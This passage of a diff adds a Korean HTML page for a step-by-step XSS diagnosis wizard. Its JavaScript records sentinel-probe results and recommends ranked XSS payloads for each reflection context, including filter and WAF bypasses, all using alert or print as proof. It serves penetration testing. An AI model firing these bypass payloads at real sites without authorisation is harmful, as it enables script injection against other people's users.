@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS 진단 가이드 — Security Toolkit</title>
+  <style>
+    *{box-sizing:border-box}
+    body{margin:0;background:#f7f8fa;color:#191f28;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+    a{color:inherit;text-decoration:none}
+    button,input,select,textarea{font:inherit}
+    .top{position:sticky;top:0;z-index:10;background:rgba(255,255,255,.92);backdrop-filter:blur(14px);border-bottom:1px solid #e5e8eb}
+    .nav{max-width:1200px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+    .brand{display:flex;align-items:center;gap:10px;font-weight:800}
+    .mark{width:30px;height:30px;border-radius:8px;background:#e03131;color:#fff;display:grid;place-items:center;font-size:13px;font-weight:900}
+    .nav-links{display:flex;gap:20px;color:#6b7684;font-size:14px;font-weight:600}
+    .nav-links a:hover{color:#191f28}
+    .wrap{max-width:1200px;margin:0 auto;padding:28px 20px 56px}
+    .hero{margin-bottom:24px}
+    .eyebrow{display:inline-flex;align-items:center;gap:6px;border:1px solid #ffd0d0;background:#fff5f5;color:#e03131;border-radius:999px;padding:6px 14px;font-size:13px;font-weight:700;margin-bottom:12px}
+    h1{margin:0 0 8px;font-size:28px;font-weight:900;line-height:1.25}
+    .lead{margin:0;color:#6b7684;font-size:15px;line-height:1.6}
+
+    /* Step indicator */
+    .steps{display:flex;align-items:center;margin:20px 0 24px;overflow-x:auto;gap:0}
+    .step-item{display:flex;align-items:center;flex-shrink:0}
+    .step-btn{display:flex;align-items:center;gap:8px;cursor:pointer;background:none;border:none;padding:0}
+    .step-num{width:30px;height:30px;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:800;border:2px solid #d1d6db;background:#fff;color:#8b95a1;transition:.2s}
+    .step-lbl{font-size:13px;font-weight:700;color:#8b95a1;transition:.2s;white-space:nowrap}
+    .step-conn{width:36px;height:2px;background:#e5e8eb;flex-shrink:0;margin:0 4px}
+    .step-item.active .step-num{background:#e03131;border-color:#e03131;color:#fff}
+    .step-item.active .step-lbl{color:#191f28}
+    .step-item.done .step-num{background:#34c759;border-color:#34c759;color:#fff}
+    .step-item.done .step-lbl{color:#34c759}
+
+    /* Wizard layout */
+    .wizard-grid{display:grid;grid-template-columns:minmax(0,1fr) 300px;gap:18px}
+    .step-panel{display:none}
+    .step-panel.active{display:block}
+
+    /* Panels */
+    .panel{background:#fff;border:1px solid #e5e8eb;border-radius:12px;padding:22px 24px;box-shadow:0 1px 3px rgba(0,0,0,.04)}
+    .panel h2{margin:0 0 6px;font-size:19px;font-weight:900}
+    .panel-lead{margin:0 0 18px;color:#6b7684;font-size:13.5px;line-height:1.6}
+    .panel h3{margin:18px 0 10px;font-size:13px;font-weight:700;color:#4e5968;text-transform:uppercase;letter-spacing:.04em}
+
+    /* Radio options */
+    .radio-group{display:flex;flex-direction:column;gap:8px}
+    .radio-row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+    .ro{display:flex;align-items:flex-start;gap:10px;border:1.5px solid #e5e8eb;border-radius:10px;padding:12px 14px;cursor:pointer;transition:.15s;user-select:none}
+    .ro:hover{border-color:#e03131;background:#fff5f5}
+    .ro.sel{border-color:#e03131;background:#fff5f5}
+    .ro input[type=radio]{accent-color:#e03131;margin-top:2px;flex-shrink:0}
+    .ro .ot{font-weight:700;font-size:13.5px;margin-bottom:2px}
+    .ro .od{font-size:12px;color:#8b95a1}
+
+    /* Sentinel display */
+    .sentinel-box{background:#0d1117;border-radius:10px;padding:14px 18px;margin:10px 0}
+    .s-label{font-size:11px;color:#8b95a1;font-weight:700;margin-bottom:6px;letter-spacing:.06em;text-transform:uppercase}
+    .s-val{font-family:"SFMono-Regular",Consolas,monospace;font-size:14px;color:#58c8e8;display:flex;align-items:center;justify-content:space-between;gap:8px;word-break:break-all}
+    .s-copy{background:#1e2938;border:1px solid #30363d;color:#8b95a1;border-radius:6px;padding:4px 10px;font-size:11px;cursor:pointer;white-space:nowrap;flex-shrink:0}
+    .s-copy:hover{background:#2d3748;color:#fff}
+
+    /* Char grid */
+    .char-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:7px;margin:10px 0}
+    .char-card{border:1.5px solid #e5e8eb;border-radius:10px;padding:10px 8px;text-align:center;background:#fff}
+    .char-card .ch{font-family:monospace;font-size:17px;font-weight:700;color:#191f28;margin-bottom:8px}
+    .char-btns{display:flex;gap:3px;justify-content:center}
+    .cbtn{border:1.5px solid #e5e8eb;background:#fff;border-radius:5px;padding:3px 6px;font-size:10px;font-weight:700;cursor:pointer;transition:.12s;color:#6b7684}
+    .cbtn.pass{background:#e6f9ee;border-color:#34c759;color:#34c759}
+    .cbtn.encoded{background:#fff8e1;border-color:#f5c400;color:#b38000}
+    .cbtn.blocked{background:#fff0f0;border-color:#f04452;color:#f04452}
+
+    /* Extras */
+    .extras-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:8px;margin:10px 0}
+    .extra-card{border:1.5px solid #e5e8eb;border-radius:10px;padding:12px;background:#fff}
+    .extra-card .el{font-size:13px;font-weight:700;margin-bottom:3px}
+    .extra-card .ep{font-family:monospace;font-size:11px;color:#6b7684;margin-bottom:8px}
+
+    /* Context grid */
+    .ctx-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+    .ctx-card{border:1.5px solid #e5e8eb;border-radius:10px;padding:12px 14px;cursor:pointer;transition:.15s;background:#fff;position:relative}
+    .ctx-card:hover{border-color:#e03131}
+    .ctx-card.sel{border-color:#e03131;background:#fff5f5}
+    .ctx-card .cn{font-weight:700;font-size:13px;margin-bottom:6px}
+    .ctx-card pre{font-size:11px;color:#6b7684;background:#f7f8fa;border-radius:6px;padding:6px 8px;margin:0;overflow:hidden;white-space:pre-wrap;word-break:break-all;line-height:1.5}
+    .ctx-card .ctx-hl{color:#e03131;font-weight:700}
+    .ctx-badge{position:absolute;top:10px;right:10px;background:#e03131;color:#fff;border-radius:4px;padding:1px 7px;font-size:10px;font-weight:700}
+
+    /* Payload cards */
+    .pl-list{display:flex;flex-direction:column;gap:10px}
+    .pc{border:1.5px solid #e5e8eb;border-radius:10px;padding:14px 16px;background:#fff;transition:.15s}
+    .pc:hover{border-color:#e03131;box-shadow:0 2px 8px rgba(224,49,49,.08)}
+    .pc.pc-blocked{opacity:.4;border-style:dashed}
+    .pc.pc-success{border-color:#34c759;background:#f0fff4}
+    .pc-head{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:8px}
+    .pc-label{font-weight:700;font-size:13.5px}
+    .tier-badge{border-radius:5px;padding:3px 8px;font-size:10px;font-weight:800;flex-shrink:0}
+    .t1{background:#e8f5e9;color:#2e7d32}
+    .t2{background:#fff3e0;color:#e65100}
+    .t3{background:#fce4ec;color:#c62828}
+    .pc-code{font-family:monospace;font-size:12px;background:#0d1117;color:#58c8e8;border-radius:8px;padding:10px 12px;margin:8px 0;word-break:break-all;line-height:1.55}
+    .pc-desc{font-size:12px;color:#6b7684;line-height:1.5;margin-bottom:8px}
+    .pc-actions{display:flex;gap:6px;flex-wrap:wrap}
+    .pc-fail{font-size:11px;color:#8b95a1;margin-top:6px;padding-top:6px;border-top:1px dashed #e5e8eb;line-height:1.5}
+
+    /* Stats */
+    .stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
+    .stat{text-align:center;padding:12px 8px;background:#f7f8fa;border-radius:10px;border:1px solid #e5e8eb}
+    .stat .sn{font-size:24px;font-weight:900}
+    .stat .sl{font-size:11px;color:#6b7684;margin-top:2px}
+    .stat.ss .sn{color:#34c759}
+    .stat.st .sn{color:#3182f6}
+    .stat.sb .sn{color:#f04452}
+
+    /* Buttons */
+    .btn{border:0;border-radius:8px;height:40px;padding:0 16px;font-weight:800;cursor:pointer;transition:.15s;font-size:14px}
+    .btn-p{background:#e03131;color:#fff}
+    .btn-p:hover{background:#c02020}
+    .btn-s{background:#f2f4f6;color:#4e5968}
+    .btn-s:hover{background:#e5e8eb}
+    .btn-d{background:#fff0f0;color:#f04452;border:1px solid #ffd0d0}
+    .btn-ok{background:#e8f5e9;color:#2e7d32;border:1px solid #c8e6c9}
+    .btn-sm{height:32px;padding:0 10px;font-size:12px;border-radius:6px}
+    .actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:20px}
+
+    /* Info/warn boxes */
+    .info-box{background:#f0f5ff;border:1px solid #c5d9f8;border-radius:8px;padding:12px 14px;font-size:13px;color:#1a4a8a;line-height:1.6;margin:10px 0}
+    .warn-box{background:#fffbf0;border:1px solid #ffe9a0;border-radius:8px;padding:12px 14px;font-size:13px;color:#7a5200;line-height:1.6;margin:10px 0}
+
+    /* Sidebar */
+    .side{display:flex;flex-direction:column;gap:14px}
+    .side-panel{background:#fff;border:1px solid #e5e8eb;border-radius:12px;padding:16px}
+    .side-panel h3{margin:0 0 12px;font-size:14px;font-weight:800}
+    .fi{display:flex;gap:8px;padding:7px 0;border-bottom:1px solid #f0f2f5;font-size:12.5px}
+    .fi:last-child{border-bottom:none}
+    .fk{color:#6b7684;flex-shrink:0;width:75px;font-weight:600}
+    .fv{font-weight:700;word-break:break-word}
+    .fv.fp{color:#34c759}
+    .fv.fb{color:#f04452}
+    .fv.fe{color:#f5a623}
+    .char-pills{display:flex;flex-wrap:wrap;gap:3px;margin-top:4px}
+    .cpill{border-radius:4px;padding:2px 5px;font-size:10px;font-weight:700;font-family:monospace}
+    .cpill.pass{background:#e6f9ee;color:#34c759}
+    .cpill.encoded{background:#fff8e1;color:#b38000}
+    .cpill.blocked{background:#fff0f0;color:#f04452}
+
+    /* Toast */
+    .toast{position:fixed;right:20px;bottom:20px;background:#191f28;color:#fff;border-radius:8px;padding:11px 16px;font-weight:700;font-size:14px;opacity:0;transform:translateY(8px);transition:.2s;pointer-events:none;z-index:999}
+    .toast.show{opacity:1;transform:translateY(0)}
+
+    @media(max-width:900px){
+      .wizard-grid{grid-template-columns:1fr}
+      .side{order:-1}
+      .radio-row,.ctx-grid{grid-template-columns:1fr}
+    }
+    @media(max-width:600px){.char-grid{grid-template-columns:repeat(auto-fill,minmax(100px,1fr))}}
+  </style>
+</head>
+<body>
+<header class="top">
+  <div class="nav">
+    <a class="brand" href="index.html"><span class="mark">XSS</span><span>XSS 진단 가이드</span></a>
+    <div class="nav-links">
+      <a href="vuln.html">취약점 진단</a>
+      <a href="xss.html">페이로드 빌더</a>
+      <a href="index.html">전체 도구</a>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+  <section class="hero">
+    <div class="eyebrow">Cross-Site Scripting</div>
+    <h1>XSS 단계별 진단 프로세스</h1>
+    <p class="lead">센티넬 프로브로 반사 여부·문자 생존을 확인하고, 컨텍스트와 필터를 분석해 최적 페이로드를 추천받습니다.</p>
+  </section>
+
+  <!-- Step Indicator -->
+  <div class="steps">
+    <div class="step-item active" id="si1">
+      <button class="step-btn" onclick="tryGoStep(1)"><div class="step-num">1</div><div class="step-lbl">아키텍처</div></button>
+    </div>
+    <div class="step-conn"></div>
+    <div class="step-item" id="si2">
+      <button class="step-btn" onclick="tryGoStep(2)"><div class="step-num">2</div><div class="step-lbl">센티넬 프로브</div></button>
+    </div>
+    <div class="step-conn"></div>
+    <div class="step-item" id="si3">
+      <button class="step-btn" onclick="tryGoStep(3)"><div class="step-num">3</div><div class="step-lbl">컨텍스트</div></button>
+    </div>
+    <div class="step-conn"></div>
+    <div class="step-item" id="si4">
+      <button class="step-btn" onclick="tryGoStep(4)"><div class="step-num">4</div><div class="step-lbl">페이로드</div></button>
+    </div>
+  </div>
+
+  <div class="wizard-grid">
+    <div>
+      <!-- STEP 1 -->
+      <div class="step-panel active" id="panel-1">
+        <div class="panel">
+          <h2>아키텍처 파악</h2>
+          <p class="panel-lead">테스트 대상의 기본 특성을 파악합니다. 이를 바탕으로 센티넬 프로브 전략을 결정합니다.</p>
+          <h3>XSS 유형</h3>
+          <div class="radio-group">
+            <label class="ro" onclick="pick('xssType','reflected',this)">
+              <input type="radio" name="xssType" value="reflected">
+              <div><div class="ot">Reflected XSS</div><div class="od">입력값이 즉시 HTTP 응답에 반사됨 (GET/POST 파라미터)</div></div>
+            </label>
+            <label class="ro" onclick="pick('xssType','stored',this)">
+              <input type="radio" name="xssType" value="stored">
+              <div><div class="ot">Stored XSS</div><div class="od">입력값이 DB에 저장 후 다른 사용자/페이지에 출력됨</div></div>
+            </label>
+            <label class="ro" onclick="pick('xssType','dom',this)">
+              <input type="radio" name="xssType" value="dom">
+              <div><div class="ot">DOM-based XSS</div><div class="od">JavaScript가 DOM을 직접 조작 (소스→싱크 흐름)</div></div>
+            </label>
+          </div>
+          <h3>입력 전달 방식</h3>
+          <div class="radio-row">
+            <label class="ro" onclick="pick('inputSrc','get',this)">
+              <input type="radio" name="inputSrc" value="get">
+              <div><div class="ot">GET 파라미터</div><div class="od">?q=VALUE</div></div>
+            </label>
+            <label class="ro" onclick="pick('inputSrc','post',this)">
+              <input type="radio" name="inputSrc" value="post">
+              <div><div class="ot">POST Body</div><div class="od">form / JSON body</div></div>
+            </label>
+            <label class="ro" onclick="pick('inputSrc','header',this)">
+              <input type="radio" name="inputSrc" value="header">
+              <div><div class="ot">HTTP 헤더</div><div class="od">User-Agent, Referer 등</div></div>
+            </label>
+            <label class="ro" onclick="pick('inputSrc','path',this)">
+              <input type="radio" name="inputSrc" value="path">
+              <div><div class="ot">URL 경로</div><div class="od">/search/VALUE/results</div></div>
+            </label>
+          </div>
+          <div class="actions">
+            <button class="btn btn-p" onclick="goStep(2)">센티넬 프로브 시작 →</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step-panel" id="panel-2">
+        <div class="panel">
+          <h2>센티넬 프로브</h2>
+          <p class="panel-lead">아래 문자열을 입력값에 삽입하고, 응답(페이지 소스)에서 각 문자가 어떻게 처리되는지 표시하세요.</p>
+
+          <h3>① 반사 확인용 기본 센티넬</h3>
+          <div class="sentinel-box">
+            <div class="s-label">먼저 이 값으로 반사 여부 확인</div>
+            <div class="s-val"><span id="sv-basic"></span><button class="s-copy" onclick="copySentinel('sv-basic')">복사</button></div>
+          </div>
+          <p class="info-box">페이지 소스(Ctrl+U)에서 위 문자열이 그대로 보이면 반사 확인. 없으면 다른 입력 포인트를 탐색하세요.</p>
+
+          <h3>② 특수문자 프로브</h3>
+          <div class="sentinel-box">
+            <div class="s-label">전체 문자 테스트 문자열</div>
+            <div class="s-val"><span id="sv-full"></span><button class="s-copy" onclick="copySentinel('sv-full')">복사</button></div>
+          </div>
+          <p style="margin:4px 0 8px;font-size:13px;color:#6b7684">각 문자가 소스에서 어떻게 나타나는지 표시하세요:</p>
+          <div class="char-grid" id="charGrid"></div>
+
+          <h3>③ 고급 필터 확인</h3>
+          <div class="extras-grid" id="extrasGrid"></div>
+
+          <div class="actions">
+            <button class="btn btn-s" onclick="goStep(1)">← 이전</button>
+            <button class="btn btn-p" onclick="goStep(3)">컨텍스트 분석 →</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="step-panel" id="panel-3">
+        <div class="panel">
+          <h2>컨텍스트 식별</h2>
+          <p class="panel-lead">센티넬 문자열이 HTML/JS의 어느 위치에 반사되고 있는지 확인하세요. 페이지 소스(Ctrl+U)에서 센티넬을 검색합니다.</p>
+          <div id="ctxHint" class="warn-box" style="display:none"></div>
+          <div class="ctx-grid" id="ctxGrid"></div>
+          <div class="actions">
+            <button class="btn btn-s" onclick="goStep(2)">← 이전</button>
+            <button class="btn btn-p" onclick="goStep(4)">페이로드 추천받기 →</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- STEP 4 -->
+      <div class="step-panel" id="panel-4">
+        <div class="panel">
+          <h2>페이로드 추천</h2>
+          <p class="panel-lead">컨텍스트와 프로브 결과 기반으로 성공 가능성이 높은 순서로 정렬했습니다. 복사 후 삽입하고 결과를 기록하세요.</p>
+          <div class="stats-row">
+            <div class="stat st"><div class="sn" id="st-tried">0</div><div class="sl">복사/시도</div></div>
+            <div class="stat sb"><div class="sn" id="st-blocked">0</div><div class="sl">차단됨</div></div>
+            <div class="stat ss"><div class="sn" id="st-success">0</div><div class="sl">성공</div></div>
+          </div>
+          <div id="plList" class="pl-list"></div>
+          <div id="successMsg" style="display:none" class="info-box">
+            ✅ XSS 확인! 실제 공격 벡터 구성은 <a href="xss.html" style="color:#1a4a8a;font-weight:700">XSS 페이로드 빌더</a>를 참조하세요.
+          </div>
+          <div class="actions">
+            <button class="btn btn-s" onclick="goStep(3)">← 컨텍스트 변경</button>
+            <button class="btn btn-s" onclick="resetAll()">처음부터 다시</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Sidebar -->
+    <aside class="side">
+      <div class="side-panel">
+        <h3>진단 기록</h3>
+        <div id="findingsList"><p style="font-size:12px;color:#8b95a1">단계를 진행하면 여기에 누적됩니다.</p></div>
+      </div>
+      <div class="side-panel">
+        <h3>현재 단계 가이드</h3>
+        <div id="helpBox"><p style="font-size:12.5px;color:#6b7684;line-height:1.6">XSS 유형을 먼저 선택하세요. 각 유형마다 테스트 방법이 달라집니다.</p></div>
+      </div>
+    </aside>
+  </div>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const S = {
+  step: 1,
+  sentinel: '',
+  arch: { xssType: null, inputSrc: null },
+  probe: { chars: {}, extras: {} },
+  ctx: null,
+  payloads: [],
+  stats: { tried: 0, blocked: 0, success: 0 }
+};
+
+const CHARS = ['<', '>', '"', "'", '`', '/', '\\', ';', '(', ')', '{', '}', '=', '&', '#'];
+
+const EXTRAS = [
+  { key: 'scriptTag', label: '<script> 태그', probe: '<script>alert(1)</script>' },
+  { key: 'onEvent',   label: 'on* 이벤트',    probe: '<img onerror=alert(1)>' },
+  { key: 'alertKw',   label: 'alert 키워드',   probe: 'alert(1)' },
+  { key: 'jsURI',     label: 'javascript: URI', probe: 'javascript:alert(1)' },
+  { key: 'svgTag',    label: '<svg> 태그',     probe: '<svg onload=1>' }
+];
+
+const CTXS = [
+  { id: 'html_body',    name: 'HTML Body',             ex: '<div>\n  [INPUT]\n</div>',              sug: ['reflected','stored'] },
+  { id: 'html_attr_dq', name: 'HTML 속성 (큰따옴표)',   ex: '<input value="[INPUT]">',               sug: ['reflected','stored'] },
+  { id: 'html_attr_sq', name: 'HTML 속성 (작은따옴표)', ex: "<input value='[INPUT]'>",               sug: ['reflected'] },
+  { id: 'html_attr_nq', name: 'HTML 속성 (따옴표 없음)', ex: '<input value=[INPUT]>',                sug: [] },
+  { id: 'js_sq',        name: 'JS 문자열 (작은따옴표)', ex: "var x = '[INPUT]';",                    sug: ['reflected','dom'] },
+  { id: 'js_dq',        name: 'JS 문자열 (큰따옴표)',   ex: 'var x = "[INPUT]";',                    sug: ['reflected','dom'] },
+  { id: 'js_tmpl',      name: 'JS 템플릿 리터럴',      ex: 'var x = `[INPUT]`;',                    sug: ['dom'] },
+  { id: 'url_href',     name: 'URL (href/src 속성)',   ex: '<a href="[INPUT]">',                    sug: ['reflected','stored'] },
+  { id: 'svg_body',     name: 'SVG 내부',              ex: '<svg>\n  [INPUT]\n</svg>',              sug: ['stored'] },
+  { id: 'comment',      name: 'HTML 주석',             ex: '<!-- [INPUT] -->',                      sug: [] }
+];
+
+const HELP = {
+  1: 'XSS 유형을 선택하세요. Reflected는 즉시 응답 확인, Stored는 저장→조회 흐름, DOM-based는 JS 소스 분석이 필요합니다.',
+  2: '센티넬 문자열을 삽입하고 응답에서 각 문자의 처리 결과를 기록하세요. 소스 보기(Ctrl+U)를 활용하세요.',
+  3: '소스 보기에서 센티넬 위치를 찾아 컨텍스트를 선택하세요. 추천(빨간 배지) 컨텍스트를 우선 확인하세요.',
+  4: '페이로드를 복사 후 삽입하고 결과를 기록하세요. 차단됨 표시 시 더 정교한 대안이 필터링됩니다.'
+};
+
+function init() {
+  S.sentinel = 'xss_' + Math.random().toString(36).slice(2, 7);
+  document.getElementById('sv-basic').textContent = S.sentinel;
+  document.getElementById('sv-full').textContent = S.sentinel + "<>\"'`/\\;(){}=&#";
+  buildCharGrid();
+  buildExtrasGrid();
+  buildCtxGrid();
+  setHelp(1);
+  CHARS.forEach(c => S.probe.chars[c] = 'unknown');
+  EXTRAS.forEach(e => S.probe.extras[e.key] = 'unknown');
+}
+
+function pick(field, val, el) {
+  S.arch[field] = val;
+  el.closest('.radio-group, .radio-row').querySelectorAll('.ro').forEach(r => r.classList.remove('sel'));
+  el.classList.add('sel');
+}
+
+function tryGoStep(n) {
+  if (n > S.step + 1 || n > 4) return;
+  goStep(n);
+}
+
+function goStep(n) {
+  if (n === 2 && !S.arch.xssType) { toast('XSS 유형을 선택해주세요'); return; }
+  if (n === 4) {
+    if (!S.ctx) { toast('컨텍스트를 선택해주세요'); return; }
+    buildPayloads();
+  }
+  if (n === 3) updateCtxHint();
+
+  S.step = n;
+  document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('panel-' + n).classList.add('active');
+  for (let i = 1; i <= 4; i++) {
+    const el = document.getElementById('si' + i);
+    el.classList.remove('active', 'done');
+    if (i < n) el.classList.add('done');
+    if (i === n) el.classList.add('active');
+  }
+  updateFindings();
+  setHelp(n);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ── Char Grid ──
+function buildCharGrid() {
+  document.getElementById('charGrid').innerHTML = CHARS.map(c => {
+    const id = 'c' + c.codePointAt(0);
+    const disp = c === '<' ? '&lt;' : c === '>' ? '&gt;' : c === '"' ? '&quot;' : c === '&' ? '&amp;' : esc(c);
+    return `<div class="char-card">
+      <div class="ch">${disp}</div>
+      <div class="char-btns">
+        <button class="cbtn" title="그대로 반사" onclick="setChar(${c.codePointAt(0)},'pass',this)">✅</button>
+        <button class="cbtn" title="인코딩됨"   onclick="setChar(${c.codePointAt(0)},'encoded',this)">⚠️</button>
+        <button class="cbtn" title="차단됨"     onclick="setChar(${c.codePointAt(0)},'blocked',this)">❌</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function setChar(cp, status, btn) {
+  const c = String.fromCodePoint(cp);
+  S.probe.chars[c] = status;
+  btn.closest('.char-btns').querySelectorAll('.cbtn').forEach(b => b.classList.remove('pass','encoded','blocked'));
+  btn.classList.add(status);
+  updateFindings();
+}
+
+function buildExtrasGrid() {
+  document.getElementById('extrasGrid').innerHTML = EXTRAS.map(e => `
+    <div class="extra-card">
+      <div class="el">${esc(e.label)}</div>
+      <div class="ep">${esc(e.probe)}</div>
+      <div class="char-btns">
+        <button class="cbtn" onclick="setExtra('${e.key}','pass',this)">✅ 통과</button>
+        <button class="cbtn" onclick="setExtra('${e.key}','encoded',this)">⚠️ 변환</button>
+        <button class="cbtn" onclick="setExtra('${e.key}','blocked',this)">❌ 차단</button>
+      </div>
+    </div>`).join('');
+}
+
+function setExtra(key, status, btn) {
+  S.probe.extras[key] = status;
+  btn.closest('.extra-card').querySelectorAll('.cbtn').forEach(b => b.classList.remove('pass','encoded','blocked'));
+  btn.classList.add(status);
+  updateFindings();
+}
+
+// ── Context Grid ──
+function buildCtxGrid() {
+  document.getElementById('ctxGrid').innerHTML = CTXS.map(ctx => {
+    const safe = ctx.ex.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\[INPUT\]/g,'<span class="ctx-hl">[INPUT]</span>');
+    return `<div class="ctx-card" id="ctx-${ctx.id}" onclick="pickCtx('${ctx.id}',this)">
+      <div class="cn">${esc(ctx.name)}</div>
+      <pre>${safe}</pre>
+    </div>`;
+  }).join('');
+}
+
+function pickCtx(id, el) {
+  S.ctx = id;
+  document.querySelectorAll('.ctx-card').forEach(c => c.classList.remove('sel'));
+  el.classList.add('sel');
+  updateFindings();
+}
+
+function updateCtxHint() {
+  const hint = document.getElementById('ctxHint');
+  const t = S.arch.xssType;
+  const tips = {
+    reflected: '소스 보기(Ctrl+U) → 센티넬 문자열 검색 → 위치 확인',
+    stored: '저장 후 출력 페이지의 소스에서 센티넬을 검색하세요.',
+    dom: 'DevTools → Sources 탭에서 JS 코드를 확인하거나, URL 프래그먼트(#)나 파라미터가 innerHTML/document.write로 출력되는 경로를 추적하세요.'
+  };
+  if (t && tips[t]) {
+    hint.textContent = '💡 ' + tips[t];
+    hint.style.display = 'block';
+  }
+
+  // 추천 배지
+  CTXS.forEach(ctx => {
+    const el = document.getElementById('ctx-' + ctx.id);
+    if (!el) return;
+    const badge = el.querySelector('.ctx-badge');
+    if (badge) badge.remove();
+    if (t && ctx.sug.includes(t)) {
+      const b = document.createElement('span');
+      b.className = 'ctx-badge';
+      b.textContent = '추천';
+      el.appendChild(b);
+    }
+  });
+}
+
+// ── Payload Generation ──
+function cOk(c) { return S.probe.chars[c] === 'pass' || S.probe.chars[c] === 'unknown'; }
+function cBad(c) { return S.probe.chars[c] === 'blocked'; }
+function eOk(k) { return S.probe.extras[k] !== 'blocked'; }
+function eBad(k) { return S.probe.extras[k] === 'blocked'; }
+function angleOk() { return cOk('<') && cOk('>'); }
+function parenOk() { return cOk('(') && cOk(')'); }
+
+function buildPayloads() {
+  const ctx = S.ctx;
+  const pl = [];
+
+  if (ctx === 'html_body') {
+    if (angleOk()) {
+      if (eOk('scriptTag')) pl.push({ id: 'hb1', tier: 1, label: 'Script 태그 직접 삽입', p: '<script>alert(document.domain)</script>', desc: '가장 기본적인 XSS. script 태그가 필터링되지 않을 때.', fail: '차단 시 → img onerror, svg onload 시도' });
+      if (eOk('onEvent')) {
+        pl.push({ id: 'hb2', tier: 1, label: 'img onerror 이벤트', p: '<img src=x onerror=alert(document.domain)>', desc: '존재하지 않는 이미지 로드 에러를 이용한 이벤트 핸들러.', fail: '차단 시 → svg onload, details ontoggle' });
+        if (eOk('svgTag')) pl.push({ id: 'hb3', tier: 1, label: 'SVG onload', p: '<svg onload=alert(document.domain)>', desc: 'SVG 태그 onload 이벤트. 많은 WAF에서 허용됨.', fail: '차단 시 → animateTransform onbegin' });
+        if (eBad('alertKw') || !parenOk()) {
+          pl.push({ id: 'hb4', tier: 2, label: '괄호 없는 alert (템플릿 리터럴)', p: '<img src=x onerror=alert`document.domain`>', desc: '괄호가 차단될 때 템플릿 리터럴로 우회.', fail: '' });
+          pl.push({ id: 'hb5', tier: 2, label: 'print() 함수 (alert 대체)', p: '<img src=x onerror=print()>', desc: 'alert 키워드 필터링 시 print()로 XSS 확인 가능.', fail: 'confirm(), prompt()도 시도' });
+        }
+        pl.push({ id: 'hb6', tier: 2, label: 'details ontoggle (클릭 없이 실행)', p: '<details open ontoggle=alert(1)>', desc: 'HTML5 details 태그. 자동 실행, 많은 환경에서 통과.', fail: '차단 시 → marquee, video source' });
+        pl.push({ id: 'hb7', tier: 2, label: 'animateTransform onbegin (이벤트 우회)', p: '<svg><animateTransform onbegin=alert(1) attributeName=transform></svg>', desc: 'SVG 애니메이션 시작 이벤트. onerror/onload 차단 우회.', fail: '' });
+      }
+      if (eBad('onEvent') || eBad('scriptTag')) {
+        pl.push({ id: 'hb8', tier: 2, label: 'a href javascript: URI', p: '<a href="javascript:alert(1)">click</a>', desc: '이벤트 핸들러 없이 href 속성으로 JS 실행. 클릭 필요.', fail: '' });
+        pl.push({ id: 'hb9', tier: 2, label: 'iframe src javascript:', p: '<iframe src="javascript:alert(1)"></iframe>', desc: '이벤트 없이 src 속성으로 실행.', fail: '' });
+        pl.push({ id: 'hb10', tier: 3, label: 'button formaction', p: '<form><button formaction="javascript:alert(1)">X</button></form>', desc: 'formaction으로 JS 실행 (클릭 필요).', fail: '' });
+      }
+      pl.push({ id: 'hb11', tier: 3, label: '대소문자 변형 (단순 키워드 필터 우회)', p: '<ScRiPt>alert(document.domain)</sCrIpT>', desc: '대소문자 혼용. 단순 문자열 매칭 WAF 우회.', fail: '' });
+      pl.push({ id: 'hb12', tier: 3, label: '중첩 태그 (재조합 우회)', p: '<scr<script>ipt>alert(1)</scr</script>ipt>', desc: '필터가 <script> 제거 시 나머지가 조합되어 실행.', fail: '' });
+      pl.push({ id: 'hb13', tier: 3, label: 'video source onerror', p: '<video><source onerror="alert(1)"></video>', desc: '드물게 허용되는 이벤트. 태그 필터 우회.', fail: '' });
+    } else {
+      pl.push({ id: 'hb_ng', tier: 3, label: '⚠️ 꺾쇠 차단 — DOM XSS 또는 다른 포인트 확인 필요', p: '<!-- 꺾쇠(<>)가 차단되어 태그 삽입 불가 -->', desc: 'DOM 컨텍스트나 JS 문자열 컨텍스트를 확인하거나, 다른 입력 포인트를 탐색하세요.', fail: '' });
+    }
+  } else if (ctx === 'html_attr_dq') {
+    if (!cBad('"')) {
+      pl.push({ id: 'adq1', tier: 1, label: '큰따옴표 탈출 + 이벤트 삽입', p: '" onmouseover="alert(1)', desc: '"로 속성값을 닫고 새 이벤트 핸들러 삽입.', fail: '차단 시 → 태그 탈출 시도' });
+      pl.push({ id: 'adq2', tier: 1, label: '" onfocus="alert(1)" autofocus="', p: '" onfocus="alert(1)" autofocus="', desc: '포커스 이벤트. autofocus로 자동 실행 가능.', fail: '' });
+      if (angleOk()) {
+        pl.push({ id: 'adq3', tier: 1, label: '태그 탈출 후 img onerror', p: '"><img src=x onerror=alert(1)>', desc: '"로 속성 닫기, >로 태그 닫기 후 img 삽입.', fail: '' });
+        pl.push({ id: 'adq4', tier: 1, label: '태그 탈출 후 svg onload', p: '"><svg onload=alert(1)>', desc: '태그 탈출 후 SVG 삽입.', fail: '' });
+      }
+    }
